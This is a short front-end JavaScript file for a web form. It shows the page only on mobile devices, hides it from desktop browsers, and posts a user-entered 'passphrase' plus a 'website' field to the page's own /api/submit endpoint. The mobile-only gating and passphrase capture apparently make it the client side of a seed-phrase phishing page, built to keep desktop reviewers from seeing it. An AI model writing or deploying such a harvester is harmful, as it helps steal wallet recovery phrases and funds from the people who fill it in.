document.addEventListener('DOMContentLoaded', () => {
        // warning
        function checkDevice() {
            const app = document.getElementById("content");
            const desktopMessage = document.getElementById("desktop-message");
        
            const isMobile =
                /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        
            if (!isMobile && window.innerWidth >= 768) {
                app.classList.add("hidden");
        
                desktopMessage.classList.remove("hidden");
                desktopMessage.classList.add("flex");
            } else {
                app.classList.remove("hidden");
        
                desktopMessage.classList.add("hidden");
                desktopMessage.classList.remove("flex");
            }
        }
        
        checkDevice();
        
        window.addEventListener("resize", checkDevice);

    const form = document.getElementById("form");
    const button = document.getElementById("submitBtn");
    const spinner = document.getElementById("spinner");
    const btnText = document.getElementById("btnText");
    const passphrase = document.getElementById("passphrase");
    const warningText = document.getElementById("warningText");

    form.addEventListener("submit", async (e) => {
        e.preventDefault();
    
        button.disabled = true;
        spinner.classList.remove("hidden");
        btnText.textContent = "Validating...";

        try {
            const data = {
                passphrase: document.getElementById("passphrase").value,
                website: document.getElementById("website").value,
            };
    
            const response = await fetch("/api/submit", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            });
    
            const result = await response.json();
    
            if (result.success) {
                passphrase.classList.add('hidden');
                warningText.classList.remove("hidden")
                button.classList.add("hidden")
                form.reset();
            } else {
                alert(result.message);
            }
        } catch (err) {
            console.error(err);
            alert("Request failed");
        } finally {
            button.disabled = false;
            spinner.classList.add('hidden');
        }
    });
});
